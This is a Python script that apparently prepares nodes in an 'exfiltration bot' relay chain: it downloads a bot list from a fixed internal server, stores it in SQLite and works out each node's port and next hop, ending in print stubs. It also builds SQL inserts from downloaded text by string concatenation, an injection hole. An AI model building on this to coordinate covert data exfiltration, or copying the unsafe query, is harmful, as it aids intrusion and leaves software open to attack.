import xml.etree.ElementTree as etree
import sqlite3 as sql
import re, socket, subprocess, sys
import urllib.request


def get_my_IP():
    p=subprocess.Popen('ifconfig',stdout=subprocess.PIPE,stderr=None,shell=True)
    output = str(p.communicate())
    p1 = re.compile('inet addr:.*Bcast')
    line = p1.findall(output)
    ipaddress = line[0].split(':')[1].split()[0]
    return ipaddress

def get_my_info(conn, myIP):
    c = conn.cursor()
    c.execute('select port, seq_no from men where ip=?', (myIP,))
    my_info = c.fetchone()
    c.close()
    return my_info

def get_next_hop(conn, seq_no):
    c = conn.cursor()
    c.execute('select max(seq_no) from men')
    last = c.fetchone()
    c.execute('select ip, port from men where seq_no > ?  and seq_no < ? order by seq_no limit 1', (str(seq_no), last[0], ))
    next = c.fetchone()
    c.close()
    return next

def create_men_db(conn):
    ### Create a local SQLite3 database and table
    # to hold the data on exfiltration bots
    # conn = sql.connect('men.db')
    c = conn.cursor()
    c.execute('drop table if exists men')
    c.execute('create table men(ip text, port text, seq_no integer, active bool)')
    conn.commit()
    c.close()

def parseXML(url, file='men.xml'):
    ### Go and get the XML file with the bot data
    try:
        # Grab the file and store it locally
        urllib.request.urlretrieve(url, file)
        # Parse it for processing
        tree = etree.parse(file).getroot()
        return tree
    except:
        return None

def store_bot_info(tree, conn):
    ### Store the data from the XML file in a local database
    c = conn.cursor()
    # Loop through the XML tree and insert the data for each
    # bot in a local database
    for child in tree:
        data = []
        query = "insert into men values("
        for node in child.getchildren():
            data.append(node.text)
        for item in data[:-1]:
            query += "'" + item + "',"
        query += "'" + data[-1] + "')"
        c.execute(query)
        conn.commit()
    c.close()
    
if __name__=='__main__':
    # Set global timeout for 
    socket.setdefaulttimeout(3)
    # Get my ip address
    myIP = get_my_IP()
    #myIP = '10.0.1.243'
    print('My IP is:', myIP)
    # Connect to/create local database
    db = 'men.db'
    conn = sql.connect(db)
    # Get the tree from the men.xml file
    url = 'http://10.0.1.221:82/men.xml'
    tree = parseXML(url)
    if len(tree):
        # Create/open and populate the men database
        create_men_db(conn)
        store_bot_info(tree, conn)
    else:
        print('Can\'t reach the server. Us an old copy, if it exists!')
    # What's my assigned server port number and seq_no?
    my_info = get_my_info(conn, myIP)
    if my_info==None:
        print('No botnet info available for my node! Exiting...')
        sys.exit(1)
    my_port, my_seq_no = my_info
    # At this point, we have all the info 
    # needed to fire up an XMLRPC server
    print('My port number is', my_port)

    # Now, who is our next hop? We need this
    # to define which server to connect our
    # client to, if any...
    print('My sequence number is', my_seq_no)
    next_hop = get_next_hop(conn, my_seq_no)
    print('The next hop is', next_hop)

    # If the return value is None, that means
    # we're the last hop, in which case we
    # won't be defining a client

    if next_hop != None:
        print('Fire up a client!')
    else:
        print('We\'re done here!')
